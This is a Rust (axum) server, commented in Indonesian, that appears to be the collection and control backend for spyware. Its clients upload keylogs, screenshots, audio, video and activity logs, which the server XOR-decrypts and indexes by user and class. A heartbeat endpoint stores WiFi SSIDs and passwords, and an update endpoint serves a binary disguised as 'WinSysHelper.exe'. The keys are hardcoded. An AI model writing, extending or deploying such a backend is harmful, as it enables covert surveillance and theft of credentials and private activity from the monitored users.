use axum::{
    extract::{DefaultBodyLimit, Path, State},
    http::{HeaderMap, StatusCode},
    response::IntoResponse,
    routing::{get, post},
    Json, Router,
};
use serde::{Deserialize, Serialize};
use serde_json::json;
use std::path::{PathBuf};
use std::sync::Arc;
use tokio::fs::{self, OpenOptions};
use tokio::io::AsyncWriteExt;
use tokio::sync::RwLock;
use tracing::{info, warn, error, Level};
use tracing_subscriber::FmtSubscriber;
use chrono::{DateTime, Local};
use std::collections::HashMap;
use sha2::{Sha256, Digest};

// ============================================================================
// DOMAIN MODELS & STRUCTURES
// ============================================================================

/// Metadata untuk setiap file yang di-upload
#[derive(Debug, Clone, Serialize, Deserialize)]
struct FileMetadata {
    /// Unique identifier untuk file
    file_id: String,
    /// Nama asli file dari client
    original_filename: String,
    /// Tipe data (screenshot, keylog, activity, dll)
    data_type: String,
    /// Nama user yang mengirim
    user_name: String,
    /// Kelas/grup user
    user_class: String,
    /// Versi client yang mengirim
    client_version: String,
    /// Timestamp server menerima
    received_at: DateTime<Local>,
    /// Timestamp client create file
    client_timestamp: String,
    /// Total size file dalam bytes
    file_size: u64,
    /// SHA256 hash untuk integrity checking
    file_hash: String,
    /// Status proses (uploading, complete, processing, failed)
    status: String,
    /// Path absolut file di server
    stored_path: String,
    /// IP address client (jika ada)
    client_ip: Option<String>,
    /// Additional metadata key-value
    extra_metadata: HashMap<String, String>,
}

/// Metadata untuk status aktif/heartbeat
#[derive(Debug, Clone, Serialize, Deserialize)]
struct ActiveStatusMetadata {
    /// Versi client
    client_version: String,
    /// SSID WiFi yang terhubung
    wifi_ssid: String,
    /// Password WiFi (encrypted)
    wifi_password: String,
    /// Timestamp server menerima
    received_at: DateTime<Local>,
    /// IP client jika tersedia
    client_ip: Option<String>,
    /// User info
    user_name: String,
    user_class: String,
}

/// Database index untuk quick lookup
#[derive(Debug, Clone, Serialize, Deserialize)]
struct FileIndex {
    /// Map dari file_id ke metadata
    files_by_id: HashMap<String, FileMetadata>,
    /// Map dari user ke list file_id
    files_by_user: HashMap<String, Vec<String>>,
    /// Map dari type ke list file_id
    files_by_type: HashMap<String, Vec<String>>,
    /// Map dari date ke list file_id
    files_by_date: HashMap<String, Vec<String>>,
}

impl FileIndex {
    fn new() -> Self {
        FileIndex {
            files_by_id: HashMap::new(),
            files_by_user: HashMap::new(),
            files_by_type: HashMap::new(),
            files_by_date: HashMap::new(),
        }
    }

    async fn add_file(&mut self, metadata: FileMetadata) {
        let file_id = metadata.file_id.clone();
        let user_key = format!("{}/{}", metadata.user_class, metadata.user_name);
        let type_key = metadata.data_type.clone();
        let date_key = metadata.received_at.format("%Y-%m-%d").to_string();

        // Add to files_by_id
        self.files_by_id.insert(file_id.clone(), metadata);

        // Add to files_by_user
        self.files_by_user.entry(user_key).or_insert_with(Vec::new).push(file_id.clone());

        // Add to files_by_type
        self.files_by_type.entry(type_key).or_insert_with(Vec::new).push(file_id.clone());

        // Add to files_by_date
        self.files_by_date.entry(date_key).or_insert_with(Vec::new).push(file_id);
    }

    fn query_by_user(&self, class: &str, name: &str) -> Vec<FileMetadata> {
        let key = format!("{}/{}", class, name);
        self.files_by_user
            .get(&key)
            .map(|ids| {
                ids.iter()
                    .filter_map(|id| self.files_by_id.get(id).cloned())
                    .collect()
            })
            .unwrap_or_default()
    }

    fn query_by_type(&self, data_type: &str) -> Vec<FileMetadata> {
        self.files_by_type
            .get(data_type)
            .map(|ids| {
                ids.iter()
                    .filter_map(|id| self.files_by_id.get(id).cloned())
                    .collect()
            })
            .unwrap_or_default()
    }

    fn query_by_date(&self, date: &str) -> Vec<FileMetadata> {
        self.files_by_date
            .get(date)
            .map(|ids| {
                ids.iter()
                    .filter_map(|id| self.files_by_id.get(id).cloned())
                    .collect()
            })
            .unwrap_or_default()
    }
}

/// Application state yang di-share ke semua handlers
struct AppState {
    upload_root: PathBuf,
    update_root: PathBuf,
    static_key: String,
    auth_key: String,
    exe_name: String,
    index: RwLock<FileIndex>,
}

// ============================================================================
// HELPER FUNCTIONS
// ============================================================================

/// Validasi API key dari headers
fn validate_auth(headers: &HeaderMap, key: &str) -> bool {
    get_header(headers, "X-API-Key").map_or(false, |v| v == key)
}

/// Extract header value sebagai Option untuk fleksibilitas unwrap
fn get_header(headers: &HeaderMap, key: &str) -> Option<String> {
    headers.get(key).and_then(|v| v.to_str().ok()).map(|s| s.to_string())
}

/// Parse user info dari format "Name[Class]"
fn parse_user_info(x_user: &str) -> (String, String) {
    if let (Some(s), Some(e)) = (x_user.find('['), x_user.find(']')) {
        (x_user[..s].trim().to_string(), x_user[s+1..e].trim().to_string())
    } else {
        ("Unknown".to_string(), "Unknown".to_string())
    }
}

/// Sanitasi path untuk mencegah directory traversal
fn sanitize_path(s: &str) -> String {
    s.chars()
        .filter(|c| c.is_alphanumeric() || *c == '_' || *c == '-' || *c == '.')
        .collect()
}

/// Generate unique file ID berdasarkan timestamp dan hash
fn generate_file_id() -> String {
    let timestamp = chrono::Local::now().format("%Y%m%d_%H%M%S_%3f").to_string();
    let uuid = uuid::Uuid::new_v4().to_string();
    format!("{}__{}", timestamp, &uuid[..8])
}

/// Calculate SHA256 hash dari data
fn calculate_hash(data: &[u8]) -> String {
    let mut hasher = Sha256::new();
    hasher.update(data);
    format!("{:x}", hasher.finalize())
}

/// Dekripsi data dengan static key menggunakan XOR
fn decrypt_logic(data: &mut Vec<u8>, static_key: &str) {
    let key = static_key.as_bytes();
    for i in 0..data.len() {
        data[i] ^= key[i % key.len()];
    }
}

/// Parse active status data dengan format: version|ssid|password
fn parse_active_status_data(content: &str) -> Option<(String, String, String)> {
    let parts: Vec<&str> = content.split('|').collect();
    if parts.len() >= 3 {
        Some((
            parts[0].to_string(),
            parts[1].to_string(),
            parts[2].to_string(),
        ))
    } else {
        None
    }
}

// ============================================================================
// MAIN APPLICATION SETUP
// ============================================================================

#[tokio::main]
async fn main() {
    // === INISIALISASI LOGGING ===
    let subscriber = FmtSubscriber::builder()
        .with_max_level(Level::INFO)
        .with_target(false)
        .with_thread_ids(true)
        .with_line_number(true)
        .finish();
    
    tracing::subscriber::set_global_default(subscriber)
        .expect("Failed to initialize system logger");

    // === KONFIGURASI APLIKASI ===
    let config = Arc::new(AppState {
        upload_root: PathBuf::from("./uploads"),
        update_root: PathBuf::from("./updates"),
        static_key: "WALISONGO_JAYA_SELAMANYA".to_string(),
        auth_key: "ADMIN-2025".to_string(),
        exe_name: "WinSysHelper.exe".to_string(),
        index: RwLock::new(FileIndex::new()),
    });

    // === INISIALISASI DIREKTORI ===
    if let Err(e) = fs::create_dir_all(&config.upload_root).await {
        error!("Critical: Unable to create upload directory: {}", e);
        panic!("Cannot create upload directory");
    }
    if let Err(e) = fs::create_dir_all(&config.update_root).await {
        error!("Critical: Unable to create updates directory: {}", e);
        panic!("Cannot create updates directory");
    }

    info!("Walisongo Guardian Server v3.1 - Starting initialization");

    // === LOAD INDEX DARI DISK (jika ada) ===
    let index_path = config.upload_root.join("_index.json");
    if index_path.exists() {
        if let Ok(index_data) = fs::read_to_string(&index_path).await {
            if let Ok(loaded_index) = serde_json::from_str::<FileIndex>(&index_data) {
                *config.index.write().await = loaded_index;
                info!("Loaded file index from disk with {} entries", 
                    config.index.read().await.files_by_id.len());
            }
        }
    }

    // === SETUP ROUTES ===
    let app = Router::new()
        // Upload endpoints
        .route("/upload", post(handle_upload))
        .route("/post-active", post(handle_active_status))
        
        // Update endpoints
        .route("/check-update", get(handle_check_update))
        .route("/get-update", get(handle_get_update))
        
        // Query endpoints (untuk monitoring/analytics)
        .route("/api/files/:user/:class", get(handle_query_files_by_user))
        .route("/api/files/type/:file_type", get(handle_query_files_by_type))
        .route("/api/files/date/:date", get(handle_query_files_by_date))
        .route("/api/files/:file_id/metadata", get(handle_get_file_metadata))
        .route("/api/stats", get(handle_get_stats))
        
        // Health check
        .route("/health", get(handle_health_check))
        
        .layer(DefaultBodyLimit::max(1024 * 1024 * 50))
        .with_state(config.clone());

    let addr = "0.0.0.0:8080";
    let listener = tokio::net::TcpListener::bind(addr).await.unwrap();
    
    info!("Walisongo Guardian Server v3.1 initialized successfully");
    info!("✓ Listening on {}", addr);
    info!("✓ Upload root: {:?}", config.upload_root);
    info!("✓ Update root: {:?}", config.update_root);

    axum::serve(listener, app).await.unwrap();
}

// ============================================================================
// HANDLERS - UPLOAD & TELEMETRY
// ============================================================================

/// Handler utama untuk upload file dengan support chunked upload
async fn handle_upload(
    State(config): State<Arc<AppState>>,
    headers: HeaderMap,
    body: axum::body::Bytes,
) -> StatusCode {
    // === AUTENTIKASI ===
    if !validate_auth(&headers, &config.auth_key) {
        warn!("Unauthorized upload attempt");
        return StatusCode::UNAUTHORIZED;
    }

    // === EXTRACT HEADERS ===
    let x_user = get_header(&headers, "X-User").unwrap_or_default();
    let x_type = get_header(&headers, "X-Type").unwrap_or_default();
    let file_id = get_header(&headers, "X-File-ID").unwrap_or_default();
    let filename = get_header(&headers, "X-Filename").unwrap_or_default();
    let chunk_num: i32 = get_header(&headers, "X-Chunk-Num").unwrap_or_default().parse().unwrap_or(0);
    let chunk_total: i32 = get_header(&headers, "X-Chunk-Total").unwrap_or_default().parse().unwrap_or(1);
    let client_timestamp = get_header(&headers, "X-Timestamp").unwrap_or_default();
    let client_version = get_header(&headers, "X-Version").unwrap_or_else(|| "1.0.0".to_string());

    let (user_name, user_class) = parse_user_info(&x_user);

    // === VALIDASI INPUT ===
    if x_type.is_empty() || filename.is_empty() {
        warn!("Invalid upload request: missing required headers");
        return StatusCode::BAD_REQUEST;
    }

    // === BUILD TARGET DIRECTORY STRUCTURE ===
    let date_str = Local::now().format("%Y-%m-%d").to_string();
    let time_str = Local::now().format("%H-%M-%S").to_string();

    let mut target_dir = config.upload_root.clone();
    target_dir.push(sanitize_path(&user_class));
    target_dir.push(sanitize_path(&user_name));
    target_dir.push(sanitize_path(&x_type));
    target_dir.push(&date_str);
    target_dir.push(&time_str);

    // === CREATE DIRECTORY ===
    if let Err(e) = fs::create_dir_all(&target_dir).await {
        error!(
            user = %user_name,
            class = %user_class,
            error = %e,
            "Failed to create directory structure"
        );
        return StatusCode::INTERNAL_SERVER_ERROR;
    }

    // === PREPARE FILE PATH ===
    let file_path = target_dir.join(format!("{}_{}.dat", file_id, sanitize_path(&filename)));

    // === WRITE CHUNK ===
    let res = OpenOptions::new()
        .create(true)
        .append(true)
        .open(&file_path)
        .await;

    match res {
        Ok(mut f) => {
            if let Err(e) = f.write_all(&body).await {
                error!(
                    file = %filename,
                    user = %user_name,
                    error = %e,
                    "Failed to write chunk"
                );
                return StatusCode::INTERNAL_SERVER_ERROR;
            }

            info!(
                user = %user_name,
                file = %filename,
                chunk = chunk_num,
                total = chunk_total,
                "Chunk received and written"
            );

            // === FINALIZE JIKA SEMUA CHUNK SELESAI ===
            if chunk_num == chunk_total - 1 {
                info!(
                    user = %user_name,
                    file = %filename,
                    type = %x_type,
                    "All chunks received, finalizing file"
                );

                let static_key = config.static_key.clone();
                let file_path_clone = file_path.clone();
                let x_type_clone = x_type.clone();
                let config_clone = config.clone();
                let user_name_clone = user_name.clone();
                let user_class_clone = user_class.clone();
                let filename_clone = filename.clone();
                let client_version_clone = client_version.clone();
                let client_timestamp_clone = client_timestamp.clone();

                tokio::spawn(async move {
                    finalize_file_task(
                        file_path_clone,
                        x_type_clone,
                        static_key,
                        config_clone,
                        user_name_clone,
                        user_class_clone,
                        filename_clone,
                        client_version_clone,
                        client_timestamp_clone,
                    )
                    .await;
                });
            }

            StatusCode::OK
        }
        Err(e) => {
            error!(
                path = ?file_path,
                user = %user_name,
                error = %e,
                "Failed to open file for writing"
            );
            StatusCode::INTERNAL_SERVER_ERROR
        }
    }
}

/// Handler untuk active status / heartbeat dari client
async fn handle_active_status(
    State(config): State<Arc<AppState>>,
    headers: HeaderMap,
    body: axum::body::Bytes,
) -> StatusCode {
    // === AUTENTIKASI ===
    if !validate_auth(&headers, &config.auth_key) {
        warn!("Unauthorized active status attempt");
        return StatusCode::UNAUTHORIZED;
    }

    // === EXTRACT HEADERS ===
    let x_user = get_header(&headers, "X-User").unwrap_or_default();
    let (user_name, user_class) = parse_user_info(&x_user);

    // === DEKRIPSI DATA ===
    let mut data = body.to_vec();
    decrypt_logic(&mut data, &config.static_key);

    // === PARSE DATA ===
    if let Ok(content) = String::from_utf8(data) {
        if let Some((version, ssid, password)) = parse_active_status_data(&content) {
            let active_status = ActiveStatusMetadata {
                client_version: version.clone(),
                wifi_ssid: ssid.clone(),
                wifi_password: password.clone(),
                received_at: Local::now(),
                client_ip: get_header(&headers, "X-Client-IP")
                    .and_then(|s| s.split(';').next().map(|ip| ip.to_string())),
                user_name: user_name.clone(),
                user_class: user_class.clone(),
            };

            info!(
                user = %user_name,
                class = %user_class,
                version = %version,
                ssid = %ssid,
                "Heartbeat received"
            );

            let log_dir = config.upload_root
                .join(sanitize_path(&user_class))
                .join(sanitize_path(&user_name));

            if let Err(e) = fs::create_dir_all(&log_dir).await {
                error!("Failed to create telemetry log directory: {}", e);
                return StatusCode::INTERNAL_SERVER_ERROR;
            }

            let log_path = log_dir.join("_active_status.jsonl");

            if let Ok(mut f) = OpenOptions::new()
                .create(true)
                .append(true)
                .open(&log_path)
                .await
            {
                let log_entry = serde_json::to_string(&active_status)
                    .unwrap_or_else(|_| "{}".to_string());
                let _ = f.write_all(format!("{}\n", log_entry).as_bytes()).await;
            }

            let readable_log_path = log_dir.join("connection_history.log");
            if let Ok(mut f) = OpenOptions::new()
                .create(true)
                .append(true)
                .open(&readable_log_path)
                .await
            {
                let timestamp = Local::now().format("%Y-%m-%d %H:%M:%S");
                let log_line = format!(
                    "[{}] Version: {}, WiFi: {}, IP: {}\n",
                    timestamp,
                    version,
                    ssid,
                    active_status.client_ip.as_ref().unwrap_or(&"N/A".to_string())
                );
                let _ = f.write_all(log_line.as_bytes()).await;
            }

            return StatusCode::OK;
        } else {
            warn!("Failed to parse active status data format");
        }
    } else {
        warn!("Failed to decode UTF-8 from heartbeat data");
    }

    StatusCode::OK
}

// ============================================================================
// HANDLERS - UPDATE MANAGEMENT
// ============================================================================

async fn handle_check_update(
    State(config): State<Arc<AppState>>,
    headers: HeaderMap,
) -> impl IntoResponse {
    if !validate_auth(&headers, &config.auth_key) {
        warn!("Unauthorized update check attempt");
        return (
            StatusCode::UNAUTHORIZED,
            Json(json!({"latest_hash": "error", "version": "error"})),
        );
    }

    let exe_path = config.update_root.join(&config.exe_name);
    
    let (hash, version) = match fs::read(&exe_path).await {
        Ok(data) => {
            let hash = calculate_hash(&data);
            let version = "1.6.2".to_string(); // PERBAIKAN: Kembali ke 1.6.2 sesuai kode sukses
            (hash, version)
        }
        Err(e) => {
            warn!("Update component missing at path {:?}: {}", exe_path, e);
            ("not_found".to_string(), "not_found".to_string())
        }
    };

    info!(
        action = "version_check",
        hash = %hash,
        version = %version,
        "Update verification request processed"
    );

    // PERBAIKAN: Menghapus status: success agar format identik dengan versi 200 baris
    (
        StatusCode::OK,
        Json(json!({
            "latest_hash": hash,
            "version": version
        })),
    )
}

async fn handle_get_update(
    State(config): State<Arc<AppState>>,
    headers: HeaderMap,
) -> impl IntoResponse {
    if !validate_auth(&headers, &config.auth_key) {
        warn!("Unauthorized binary download attempt");
        return Err(StatusCode::UNAUTHORIZED);
    }

    let update_path = config.update_root.join(&config.exe_name);
    
    match fs::read(&update_path).await {
        Ok(data) => {
            info!(
                file = %config.exe_name,
                size = data.len(),
                "Update binary transmission initiated"
            );
            Ok(data)
        }
        Err(e) => {
            error!("IO Error: Failed to serve update binary: {}", e);
            Err(StatusCode::NOT_FOUND)
        }
    }
}

// ============================================================================
// HANDLERS - QUERY & ANALYTICS
// ============================================================================

async fn handle_query_files_by_user(
    State(config): State<Arc<AppState>>,
    Path((user, class)): Path<(String, String)>,
    headers: HeaderMap,
) -> impl IntoResponse {
    if !validate_auth(&headers, &config.auth_key) {
        return (StatusCode::UNAUTHORIZED, Json(json!({"error": "Unauthorized"})));
    }

    let index = config.index.read().await;
    let files = index.query_by_user(&class, &user);

    (
        StatusCode::OK,
        Json(json!({
            "user": user,
            "class": class,
            "file_count": files.len(),
            "files": files
        })),
    )
}

async fn handle_query_files_by_type(
    State(config): State<Arc<AppState>>,
    Path(file_type): Path<String>,
    headers: HeaderMap,
) -> impl IntoResponse {
    if !validate_auth(&headers, &config.auth_key) {
        return (StatusCode::UNAUTHORIZED, Json(json!({"error": "Unauthorized"})));
    }

    let index = config.index.read().await;
    let files = index.query_by_type(&file_type);

    (
        StatusCode::OK,
        Json(json!({
            "type": file_type,
            "file_count": files.len(),
            "files": files
        })),
    )
}

async fn handle_query_files_by_date(
    State(config): State<Arc<AppState>>,
    Path(date): Path<String>,
    headers: HeaderMap,
) -> impl IntoResponse {
    if !validate_auth(&headers, &config.auth_key) {
        return (StatusCode::UNAUTHORIZED, Json(json!({"error": "Unauthorized"})));
    }

    let index = config.index.read().await;
    let files = index.query_by_date(&date);

    (
        StatusCode::OK,
        Json(json!({
            "date": date,
            "file_count": files.len(),
            "files": files
        })),
    )
}

async fn handle_get_file_metadata(
    State(config): State<Arc<AppState>>,
    Path(file_id): Path<String>,
    headers: HeaderMap,
) -> impl IntoResponse {
    if !validate_auth(&headers, &config.auth_key) {
        return (StatusCode::UNAUTHORIZED, Json(json!({"error": "Unauthorized"})));
    }

    let index = config.index.read().await;
    
    match index.files_by_id.get(&file_id) {
        Some(metadata) => (StatusCode::OK, Json(json!(metadata))),
        None => (StatusCode::NOT_FOUND, Json(json!({"error": "File not found"}))),
    }
}

async fn handle_get_stats(
    State(config): State<Arc<AppState>>,
    headers: HeaderMap,
) -> impl IntoResponse {
    if !validate_auth(&headers, &config.auth_key) {
        return (StatusCode::UNAUTHORIZED, Json(json!({"error": "Unauthorized"})));
    }

    let index = config.index.read().await;

    let total_files = index.files_by_id.len();
    let total_users = index.files_by_user.len();
    let total_types = index.files_by_type.len();

    let total_size: u64 = index.files_by_id.values().map(|m| m.file_size).sum();

    let type_distribution: HashMap<String, usize> = index
        .files_by_type
        .iter()
        .map(|(k, v)| (k.clone(), v.len()))
        .collect();

    (
        StatusCode::OK,
        Json(json!({
            "total_files": total_files,
            "total_users": total_users,
            "total_data_types": total_types,
            "total_size_bytes": total_size,
            "total_size_mb": (total_size as f64) / (1024.0 * 1024.0),
            "type_distribution": type_distribution,
            "index_last_updated": chrono::Local::now().to_rfc3339()
        })),
    )
}

async fn handle_health_check() -> impl IntoResponse {
    (
        StatusCode::OK,
        Json(json!({
            "status": "healthy",
            "version": "3.1",
            "timestamp": chrono::Local::now().to_rfc3339()
        })),
    )
}

// ============================================================================
// BACKGROUND TASKS
// ============================================================================

async fn finalize_file_task(
    path: PathBuf,
    x_type: String,
    static_key: String,
    config: Arc<AppState>,
    user_name: String,
    user_class: String,
    filename: String,
    client_version: String,
    client_timestamp: String,
) {
    if let Ok(file_data) = fs::read(&path).await {
        let file_size = file_data.len() as u64;
        let file_hash = calculate_hash(&file_data);

        let mut decrypted_data = file_data.clone();
        decrypt_logic(&mut decrypted_data, &static_key);

        let extension = match x_type.as_str() {
            "screenshot" => "jpg",
            "keylog" => "txt",
            "activity" => "txt",
            "video" => "mp4",
            "audio" => "wav",
            _ => "bin",
        };

        let final_path = path.with_extension(extension);
        if let Err(e) = fs::write(&final_path, &decrypted_data).await {
            error!(path = ?final_path, user = %user_name, error = %e, "Failed to write finalized file");
            return;
        }

        let _ = fs::remove_file(&path).await;

        let file_id = generate_file_id();
        let metadata = FileMetadata {
            file_id: file_id.clone(),
            original_filename: filename.clone(),
            data_type: x_type.clone(),
            user_name: user_name.clone(),
            user_class: user_class.clone(),
            client_version,
            received_at: Local::now(),
            client_timestamp,
            file_size,
            file_hash,
            status: "complete".to_string(),
            stored_path: final_path.to_string_lossy().to_string(),
            client_ip: None,
            extra_metadata: HashMap::new(),
        };

        let metadata_path = final_path.with_extension("json");
        if let Ok(metadata_json) = serde_json::to_string_pretty(&metadata) {
            let _ = fs::write(&metadata_path, metadata_json).await;
        }

        {
            let mut index = config.index.write().await;
            index.add_file(metadata.clone()).await;
        }

        let index = config.index.read().await;
        let index_path = config.upload_root.join("_index.json");
        if let Ok(index_json) = serde_json::to_string_pretty(&*index) {
            let _ = fs::write(&index_path, index_json).await;
        }

        info!(
            user = %user_name,
            file = %filename,
            type = %x_type,
            size = file_size,
            final_path = ?final_path,
            "File finalized successfully"
        );
    } else {
        error!(path = ?path, user = %user_name, "Failed to read file for finalization");
    }
}